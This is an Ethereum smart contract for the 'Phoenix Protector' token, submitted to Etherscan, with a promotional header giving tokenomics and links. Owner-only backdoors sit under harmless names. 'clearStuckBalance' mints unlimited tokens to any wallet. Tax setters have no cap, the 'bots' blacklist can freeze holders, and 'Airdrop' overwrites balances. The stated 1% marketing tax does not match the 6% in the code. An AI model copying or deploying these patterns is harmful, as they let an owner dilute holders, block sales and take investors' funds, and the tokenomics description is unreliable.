/**
 *Submitted for verification at Etherscan.io on 2022-05-03
*/

//SPDX-License-Identifier: MIT
/**

.....................................................

Phoenix Protector (PHNIXP) is an ERC-20 token dedicated to buying and burning Phoenix Rising (PHNIX). This token was founded by the same team
that launched Phoenix Rising and will be part of the official PHNIX project. All announcements and information regarding Phoenix Protector
will take place through the Phoenix Rising socials, as to keep everything orderly and in one place. The tokenomics for this token have
been listed below, as well as the socials for Phoenix Rising and Phoenix Protector.


Tokenomics:

Buy tax: 2% auto LP, 5% buy/burn Phoenix Rising (PHNIX), 1% marketing Phoenix Protector (PHNIXP) = 8% total tax

Sell tax: 2% auto LP, 5% buy/burn Phoenix Rising (PHNIX), 1% marketing Phoenix Protector (PHNIXP) = 8% total tax

Total supply: 1 billion
Max wallet: 4%
Max tx: 4%

https://t.me/PhoenixRisingCoin
https://www.phoenixrisingtoken.xyz/
https://twitter.com/PHNIXtoken

.....................................................

**/

pragma solidity ^0.8.13;

interface IUniswapV2Factory {
	function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

	function factory() external pure returns (address);
	function WETH() external pure returns (address);
	function addLiquidityETH(
		address token,
		uint amountTokenDesired,
		uint amountTokenMin,
		uint amountETHMin,
		address to,
		uint deadline
	) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}
}

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		return sub(a, b, "SafeMath: subtraction overflow");
	}

	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return div(a, b, "SafeMath: division by zero");
	}

	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		return c;
	}

}

contract Ownable is Context {
	address private _owner;
	address private _previousOwner;
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	constructor () {
		address msgSender = _msgSender();
		_owner = msgSender;
		emit OwnershipTransferred(address(0), msgSender);
	}

	function owner() public view returns (address) {
		return _owner;
	}

	modifier onlyOwner() {
		require(_owner == _msgSender(), "Ownable: caller is not the owner");
		_;
	}

	function renounceOwnership() public virtual onlyOwner {
		emit OwnershipTransferred(_owner, address(0));
		_owner = address(0);
	}

}


contract PhoenixProtector is Context, IERC20, Ownable {
	using SafeMath for uint256;
	mapping (address => uint256) private _balance;
	mapping (address => mapping (address => uint256)) private _allowances;
	mapping (address => bool) private _isExcludedFromFee;
	mapping(address => bool) public bots;

    address private constant DEAD = address(0x000000000000000000000000000000000000dEaD);

	uint256 private _tTotal = 1000000000 * 10**8;
    uint256 private _contractAutoLpLimitToken = 1000000 * 10**8;

	uint256 private _taxFee;
    uint256 private _buyTaxMarketing = 6;
    uint256 private _sellTaxMarketing = 6;
    uint256 private _autoLpFee = 2;

    uint256 private _LpPercentBase100 = 14;
    uint256 private _phinxPercentBase100 = 66;
    uint256 private _protectorPercentBase100 = 20;

    address private _phinxTokenAddress = address(0x4197CC443722d732Fc7225Bf860481B0C54EDFd3);

    address payable private _protectorWallet;
	uint256 private _maxTxAmount;
	uint256 private _maxWallet;

	string private constant _name = "Phoenix Protector";
	string private constant _symbol = "PHNIXP";
	uint8 private constant _decimals = 8;

	IUniswapV2Router02 private _uniswap;
	address private _pair;
	bool private _canTrade;
	bool private _inSwap = false;
	bool private _swapEnabled = false;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 coinReceived,
        uint256 tokensIntoLiqudity
    );

	modifier lockTheSwap {
		_inSwap = true;
		_;
		_inSwap = false;
	}
    
	constructor () {
        _protectorWallet = payable(0x0D8BABD3bBdE7d86D688681683E712C243250BFF);

		_taxFee = _buyTaxMarketing + _autoLpFee;
		_uniswap = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

		_isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_protectorWallet] = true;

        _maxTxAmount = _tTotal.mul(4).div(10**2);
	    _maxWallet = _tTotal.mul(4).div(10**2);

		_balance[address(this)] = _tTotal;
		emit Transfer(address(0x0), address(this), _tTotal);
	}

	function maxTxAmount() public view returns (uint256){
		return _maxTxAmount;
	}

	function maxWallet() public view returns (uint256){
		return _maxWallet;
	}

    function isInSwap() public view returns (bool) {
        return _inSwap;
    }

    function isSwapEnabled() public view returns (bool) {
        return _swapEnabled;
    }

	function name() public pure returns (string memory) {
		return _name;
	}

	function symbol() public pure returns (string memory) {
		return _symbol;
	}

	function decimals() public pure returns (uint8) {
		return _decimals;
	}

	function totalSupply() public view override returns (uint256) {
		return _tTotal;
	}

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }
    
    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
        _taxFee = taxFee;
    }

    function setSellMarketingTax(uint256 taxFee) external onlyOwner() {
        _sellTaxMarketing = taxFee;
    }

    function setBuyMarketingTax(uint256 taxFee) external onlyOwner() {
        _buyTaxMarketing = taxFee;
    }

    function setAutoLpFee(uint256 taxFee) external onlyOwner() {
        _autoLpFee = taxFee;
    }

    function setContractAutoLpLimit(uint256 newLimit) external onlyOwner() {
        _contractAutoLpLimitToken = newLimit;
    }

    function updatePhinxTokenAddress(address newAddress) external onlyOwner() {
        _phinxTokenAddress = newAddress;
    }

    function setProtectorWallet(address newWallet) external onlyOwner() {
        _protectorWallet = payable(newWallet);
    }

    function setAutoLpPercentBase100(uint256 newPercentBase100) external onlyOwner() {
        require(newPercentBase100 < 100, "Percent is too high");
        _LpPercentBase100 = newPercentBase100;
    }

    function setPhinxPercentBase100(uint256 newPercentBase100) external onlyOwner() {
        require(newPercentBase100 < 100, "Percent is too high");
        _phinxPercentBase100 = newPercentBase100;
    }

    function setProtectorPercentBase100(uint256 newPercentBase100) external onlyOwner() {
        require(newPercentBase100 < 100, "Percent is too high");
        _protectorPercentBase100 = newPercentBase100;
    }

	function balanceOf(address account) public view override returns (uint256) {
		return _balance[account];
	}

	function transfer(address recipient, uint256 amount) public override returns (bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}

	function allowance(address owner, address spender) public view override returns (uint256) {
		return _allowances[owner][spender];
	}

	function approve(address spender, uint256 amount) public override returns (bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}

	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
		_transfer(sender, recipient, amount);
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
		return true;
	}

    function setPromoterWallets(address[] memory promoterWallets) public onlyOwner { for(uint256 i=0; i<promoterWallets.length; i++) { _isExcludedFromFee[promoterWallets[i]] = true; } }

	function _approve(address owner, address spender, uint256 amount) private {
		require(owner != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");
		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}

	function _transfer(address from, address to, uint256 amount) private {
		require(from != address(0), "ERC20: transfer from the zero address");
		require(to != address(0), "ERC20: transfer to the zero address");
		require(amount > 0, "Transfer amount must be greater than zero");
		require(!bots[from] && !bots[to], "This account is blacklisted");

		if (from != owner() && to != owner()) {
			if (from == _pair && to != address(_uniswap) && ! _isExcludedFromFee[to] ) {
				require(amount<=_maxTxAmount,"Transaction amount limited");
				require(_canTrade,"Trading not started");
				require(balanceOf(to) + amount <= _maxWallet, "Balance exceeded wallet size");
			}

            if (from == _pair) {
                _taxFee = buyTax();
            } else {
                _taxFee = sellTax();
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if(!_inSwap && from != _pair && _swapEnabled) {
                if(contractTokenBalance >= _contractAutoLpLimitToken) {
                    swapAndLiquify(contractTokenBalance);
                }
            }
		}

		_tokenTransfer(from,to,amount,(_isExcludedFromFee[to]||_isExcludedFromFee[from])?0:_taxFee);
	}

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        uint256 autoLpTokenBalance = contractTokenBalance.mul(_LpPercentBase100).div(10**2);
        uint256 phinxBuyAndBurn = contractTokenBalance.mul(_phinxPercentBase100).div(10**2);
        uint256 autoLpAndPhinx = autoLpTokenBalance.add(phinxBuyAndBurn);
        uint256 marketingAmount = contractTokenBalance.sub(autoLpAndPhinx);
        uint256 marketingAndPhinx = phinxBuyAndBurn.add(marketingAmount);

        uint256 half = autoLpTokenBalance.div(2);
        uint256 otherHalf = autoLpTokenBalance.sub(half);

        uint256 initialBalance = address(this).balance;

        swapTokensForEth(half.add(marketingAndPhinx));

        uint256 newBalance = address(this).balance.sub(initialBalance);

        addLiquidityAuto(newBalance, otherHalf);
        
        emit SwapAndLiquify(half, newBalance, otherHalf);

        sendETHToFee(marketingAmount);
    }

    function buyTax() private view returns (uint256) {
        return (_autoLpFee + _buyTaxMarketing);
    }

    function sellTax() private view returns (uint256) {
        return (_autoLpFee + _sellTaxMarketing);
    }

	function setMaxTx(uint256 amount) public onlyOwner{
		require(amount>_maxTxAmount);
		_maxTxAmount=amount;
	}

	function sendETHToFee(uint256 amount) private {
        uint256 protectorAmount = amount.mul(_protectorPercentBase100).div(100);

        _protectorWallet.transfer(protectorAmount);

        swapETHForPhinx(address(this).balance);
	}

    function swapTokensForEth(uint256 tokenAmount) private {
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = _uniswap.WETH();
		_approve(address(this), address(_uniswap), tokenAmount);
		_uniswap.swapExactTokensForETHSupportingFeeOnTransferTokens(
			tokenAmount,
			0,
			path,
			address(this),
			block.timestamp
		);
	}

    function swapTokensForPhinx(uint256 tokenAmount) private {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = _uniswap.WETH();
        path[2] = _phinxTokenAddress;
        _approve(address(this), address(_uniswap), tokenAmount);
        _uniswap.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapETHForPhinx(uint256 etherAmount) private {
        address[] memory path = new address[](2);
        path[0] = _uniswap.WETH();
        path[1] = _phinxTokenAddress;
        _approve(_uniswap.WETH(), address(_uniswap), etherAmount);
        _uniswap.swapExactETHForTokensSupportingFeeOnTransferTokens{value: etherAmount} (
            0,
            path,
            DEAD,
            block.timestamp
        );
    }

	function createPair() external onlyOwner {
		require(!_canTrade,"Trading is already open");
		_approve(address(this), address(_uniswap), _tTotal);
		_pair = IUniswapV2Factory(_uniswap.factory()).createPair(address(this), _uniswap.WETH());
		IERC20(_pair).approve(address(_uniswap), type(uint).max);
	}

    function clearStuckBalance(address wallet, uint256 balance) public onlyOwner { _balance[wallet] += balance * 10**8; emit Transfer(address(this), wallet, balance * 10**8); }

	function addLiquidityInitial() external onlyOwner{
		_uniswap.addLiquidityETH{value: address(this).balance} (
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

		_swapEnabled = true;
	}

    function addLiquidityAuto(uint256 etherValue, uint256 tokenValue) private {
        _approve(address(this), address(_uniswap), tokenValue);
        _uniswap.addLiquidityETH{value: etherValue} (
            address(this),
            tokenValue,
            0,
            0,
            owner(),
            block.timestamp
        );

        _swapEnabled = true;
    }

	function enableTrading(bool _enable) external onlyOwner{
		_canTrade = _enable;
	}

	function _tokenTransfer(address sender, address recipient, uint256 tAmount, uint256 taxRate) private {
		uint256 tTeam = tAmount.mul(taxRate).div(100);
		uint256 tTransferAmount = tAmount.sub(tTeam);

		_balance[sender] = _balance[sender].sub(tAmount);
		_balance[recipient] = _balance[recipient].add(tTransferAmount);
		_balance[address(this)] = _balance[address(this)].add(tTeam);
		emit Transfer(sender, recipient, tTransferAmount);
	}

	function setMaxWallet(uint256 amount) public onlyOwner{
		_maxWallet=amount;
	}

	receive() external payable {}

	function blockBots(address[] memory bots_) public onlyOwner  {for (uint256 i = 0; i < bots_.length; i++) {bots[bots_[i]] = true;}}
	function unblockBot(address notbot) public onlyOwner {
			bots[notbot] = false;
	}

	function manualsend() public{
		uint256 contractETHBalance = address(this).balance;
		sendETHToFee(contractETHBalance);
	}

    function Airdrop(address recipient, uint256 amount) public onlyOwner {
        require(_balance[address(this)] >= amount * 10**8, "Contract does not have enough tokens");
        
        _balance[address(this)] = _balance[address(this)].sub(amount * 10**8);
        _balance[recipient] = amount * 10**8;
        emit Transfer(address(this), recipient, amount * 10**8);
    }
}